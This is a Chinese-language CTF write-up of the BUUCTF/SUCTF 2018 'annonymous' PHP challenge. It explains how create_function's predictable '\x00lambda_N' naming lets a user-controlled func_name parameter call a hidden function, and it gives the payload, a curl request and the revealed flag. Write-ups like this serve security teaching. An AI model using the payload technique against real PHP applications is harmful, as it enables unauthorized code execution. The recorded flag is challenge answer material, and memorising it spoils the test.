---
title: "[SUCTF 2018]annonymous"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [php, create-function, anonymous-function, code-execution]
vulnerability: PHP create_function 匿名函数名称可预测导致任意函数调用
solved: true
flag: "flag{235e7a2c-bd67-456f-867a-5695e5aae837}"
---

# [SUCTF 2018]annonymous

## 题目概述
题目提供了一个 PHP 页面，使用 `create_function` 创建匿名函数，并通过 `func_name` 参数允许用户调用任意函数。

## 信息收集
访问页面直接显示源码：
```php
<?php
$MY = create_function("","die(`cat flag.php`);");
$hash = bin2hex(openssl_random_pseudo_bytes(32));
eval("function SUCTF_$hash(){"
    ."global \$MY;"
    ."\$MY();"
    ."}");
if(isset($_GET['func_name'])){
    $_GET["func_name"]();
    die();
}
show_source(__FILE__);
```

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：PHP 匿名函数名称泄露

**原理**：
1. `create_function()` 是 PHP 创建匿名函数的旧方式（PHP 7.2+ 已废弃）
2. 匿名函数的内部名称格式为 `\x00lambda_N`，其中 N 是递增的整数
3. 第一个 `create_function` 创建的函数名为 `\x00lambda_1`
4. 用户可以通过 `func_name` 参数调用任意函数，包括匿名函数

**判断过程**：
- 代码中 `$MY` 函数执行 `cat flag.php`
- 虽然随机函数名 `SUCTF_$hash` 不可预测
- 但 `$MY` 是第一个创建的匿名函数，名称为 `\x00lambda_1`
- URL 编码 `%00` 表示空字节 `\x00`

## 利用过程（Payload + Flag）

**Payload**：
```
?func_name=%00lambda_1
```

**请求**：
```bash
curl -s "http://target/?func_name=%00lambda_1"
```

**响应**：
```php
<?php
//$flag="flag{235e7a2c-bd67-456f-867a-5695e5aae837}";
```

## 复现步骤
1. 访问题目页面，查看源码
2. 分析 `create_function` 创建的匿名函数 `$MY`
3. 构造 Payload：`?func_name=%00lambda_1`
4. 获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 匿名函数名称泄露 | func_name 参数 | `%00lambda_1` | create_function 内部命名规则 |

## 知识总结（解题技巧、同类题型套路）

1. **create_function 匿名函数命名规则**：`\x00lambda_N`，N 从 1 开始递增
2. **空字节 URL 编码**：`\x00` 编码为 `%00`
3. **PHP 7.2+ 已废弃 create_function**：建议使用匿名函数 `function(){}`
4. **同类题目套路**：遇到 `create_function` + 用户可控函数调用，尝试 `\x00lambda_N`
